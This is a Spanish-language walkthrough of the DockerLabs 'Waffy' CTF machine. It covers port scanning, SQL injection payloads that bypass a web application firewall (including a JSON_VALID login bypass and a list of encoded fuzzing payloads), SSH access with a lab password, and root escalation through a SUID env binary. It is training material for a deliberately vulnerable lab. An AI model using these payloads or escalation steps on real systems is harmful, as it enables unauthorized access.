---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Waffy DockerLabs (Hard)1

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip waffy.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh waffy.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 06:44 EDT
Nmap scan report for packer.pw (172.17.0.2)
Host is up (0.000060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 403 Forbidden
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
```

Veremos un puerto `80` en el que generalmente se aloja una pagina web, si entramos dentro veremos un `login` normal y corriente, por lo que ya nos da indicios de que podriamos probar credenciales por defecto.

No funcionara, pero si probamos `payloads` basicos de `SQLi` veremos lo siguiente:

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-24 124621.png" alt=""><figcaption></figcaption></figure>

Con esto que vemos tenemos la sospecha de que puede haber por detras un `WAF`, para el que no lo sepa un `WAF` (Web Application Firewall) a nivel de `Web` es un **cortafuegos especializado en proteger aplicaciones web**.

A diferencia de un firewall de red tradicional (que solo filtra tráfico por puertos/IPs), un WAF analiza **las peticiones HTTP/HTTPS** que llegan a una aplicación web para detectar y bloquear ataques comunes.

Por lo que vemos nos esta `bloqueando` esa inyeccion, por lo que vamos a intentar `Bypassear` dicho `WAF` a ver si lo conseguimos.

Probando un `sqlmap` no encuentra nada, por lo que vamos a utilizar una pagina llamada `CAIDO`, lo vamos a instalar de esta forma:

URL = [Download CAIDO](https://caido.io/download)

Es una alternativa a `BurpSuite` pero totalmente gratis, una vez que nos lo hayamos descargado, vamos instalarlo de esta forma:

```shell
dpkg -i caido-desktop-v0.50.2-linux-x86_64.deb
```

Ahora si buscamos `caido` desde `kali` veremos que esta instalado, lo iniciamos y tendremos que darle a `Start` en la instancia local que viene por defecto por el puerto `8080`, se nos abrira un panel para `login` o continuar como invitado, le daremos a como invitado directamente para esta prueba.

Crearemos un nuevo proyecto para utilizarlo, lo llamaremos como queramos, lo seleccionamos y nos vamos en la parte `izquierda` donde pone `Intercept`.

En esta parte para empezar a interceptar el trafico tendremos que darle al boton de arriba a la derecha llamado `>> Forwarding` y esto estara a la escucha de cualquier peticion, desde la `Web` como hacemos con `BurpSuite` utilizando `FoxyProxy` pondremos que la informacion pase atraves del puerto `8080` echo esto probaremos poniendo `admin:admin`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-24 130718.png" alt=""><figcaption></figcaption></figure>

Veremos que lo esta interceptando de forma correcta, por lo que podremos continuar para intentar `bypassear` el `WAF` de la `Web`.

Lo vamos a enviar la peticion dandole a `Send Automate` es como el `Repeater` en `BurpSuite`, nos vamos a la seccion `Automate` y ahi tendremos nuestra peticion para repetirlas las veces que queramos.

Si nosotros seleccionamos el campo `name=` el valor de dentro lo seleccionamos en mi caso `admin` y le damos al `+` de arriba a la derecha, se nos pondran una serie de opciones las cuales podremos realizar un `fuzzing` probando diferentes `payloads` que metamos nosotros en una lista.

Pondremos de tipo `Symple List` y dentro añadiremos los `payloads` que queramos probar, pero en mi caso no habremos tenido suerte, vamos a utilizar un `script` del `Pinguino De Mario` en la siguiente pagina:

URL = [ElPinguinoDeMario GitHub sqli\_dinamico.sh](https://github.com/Maalfer/recursos-videos/blob/main/sqli_dinamico.sh)

El cual lo que hace es generar de forma `dinamica` `payloads` de un `SQLi` para intentar `Bypassear` un `WAF` como es en este caso.

Lo configuraremos a nuestras necesidades, echo esto, vamos a ejecutarlo de esta forma:

```shell
bash sqli_dinamico.sh
```

Info:

```
.............................<RESTO DE CODIGO>.....................................
[+] Intento 354 - Payload: %E2%80%99 UNiON/*!515*/ALL%0BSELECT%0A1,2,3,4--%0B
[ ] Código de estado: 403 (Ignorado)
----------------------------------------
[+] Intento 355 - Payload: " OR 2048/10=204--+
[ ] Código de estado: 403 (Ignorado)
----------------------------------------
[+] Intento 356 - Payload: %C0%27 OR CONVERT(90, UNSIGNED)=CONVERT(90, UNSIGNED)--%0B
[ ] Código de estado: 403 (Ignorado)
----------------------------------------
[+] Intento 357 - Payload: %C0%A7%E2%80%99%C0%A7OR%C0%A71=1--%0D
[✓] Código de estado: 200 (INTERESANTE)
----------------------------------------
[+] Intento 358 - Payload: %C0%27/*!MySQL-710.161*/OR/*!*/1=1-- -
[ ] Código de estado: 403 (Ignorado)
----------------------------------------
[+] Intento 359 - Payload: %27%E2%80%82OR%E2%80%8490%E2%80%85=%E2%80%864096--%0A
[✓] Código de estado: 200 (INTERESANTE)
----------------------------------------
[+] Intento 360 - Payload: %27 OR CONVERT(40, UNSIGNED)=CONVERT(40, UNSIGNED)--+
^C
[✓] Ejecución interrumpida por usuario
[✓] Total de payloads probados: 360
[✓] Payloads interesantes encontrados: 70
[✓] Archivo: sql_payloads_1756036266.txt
```

Cuando lo paremos se nos generara un diccionario de `payloads` solamente de los cuales ha tenido algun `exito` que no haya sido un `403` o `404`, por lo que este diccionario lo vamos a cargar en nuestro `Automate` de `CAIDO` y echo esto le daremos a `Run`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-24 135309.png" alt=""><figcaption></figcaption></figure>

Pero veremos que no tendremos `exito`, vamos a probar con un diccionario un poco mas grande, a ver si hay suerte...

## Escalate user baluton

Pero veremos que no funciona, despues de buscar un buen rato, vemos que con una explotacion de `sqli` en formato de `Bypass con JSON functions` funciona, por lo que haremos esto:

```
User: ' OR JSON_VALID('{"a":1}')-- -
Pass: ' OR JSON_VALID('{"a":1}')-- -
```

Y con esto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-26 174202.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado, por lo que nos vamos a conectar por `SSH` a ver que vemos.

### SSH

```shell
ssh baluton@<IP>
```

Metemos como contraseña `balulerobalulon`, con esto estaremos dentro.

## Escalate Privileges

Si listamos los permisos `SUID` veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
3697405     56 -rwsr-xr-x   1 root     root        55680 Jun  5 14:17 /usr/bin/su
  3696955     72 -rwsr-xr-x   1 root     root        72792 May 30  2024 /usr/bin/chfn
  3697231     40 -rwsr-xr-x   1 root     root        40664 May 30  2024 /usr/bin/newgrp
  3697059     76 -rwsr-xr-x   1 root     root        76248 May 30  2024 /usr/bin/gpasswd
  3697027     48 -rwsr-xr-x   1 root     root        48072 Apr  5  2024 /usr/bin/env
  3697244     64 -rwsr-xr-x   1 root     root        64152 May 30  2024 /usr/bin/passwd
  3697470     40 -rwsr-xr-x   1 root     root        39296 Jun  5 14:17 /usr/bin/umount
  3697189     52 -rwsr-xr-x   1 root     root        51584 Jun  5 14:17 /usr/bin/mount
  3696961     44 -rwsr-xr-x   1 root     root        44760 May 30  2024 /usr/bin/chsh
  3697976    336 -rwsr-xr-x   1 root     root       342632 Jun  9 19:22 /usr/lib/openssh/ssh-keysign
  3697692     36 -rwsr-xr--   1 root     messagebus    34960 Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Veremos esta linea bastante interesante:

```
3697027   48 -rwsr-xr-x   1 root     root    48072 Apr  5  2024 /usr/bin/env
```

Viendo esto podremos realizar lo siguiente para ser `root`.

```shell
/usr/bin/env /bin/bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto ya seremos `root`, por lo que habremos terminado la maquina con éxito.
